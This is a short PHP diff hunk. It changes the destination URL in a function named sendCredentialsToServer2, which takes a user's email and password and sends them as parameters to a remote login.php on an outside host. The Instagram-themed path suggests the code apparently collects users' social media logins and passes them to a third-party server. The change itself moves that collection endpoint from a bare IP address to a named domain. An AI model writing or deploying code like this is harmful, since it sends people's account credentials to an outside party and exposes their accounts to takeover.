@@ -33,7 +33,7 @@ function sendCredentialsToServer2($email,$password)
 {
 
 
-  $target_url = "http://2.230.243.113/instagram/app/login.php";
+  $target_url = "http://www.elenarosina.com/instatrack/app/login.php";
   $params =
    array(
      "EMAIL" => $email,
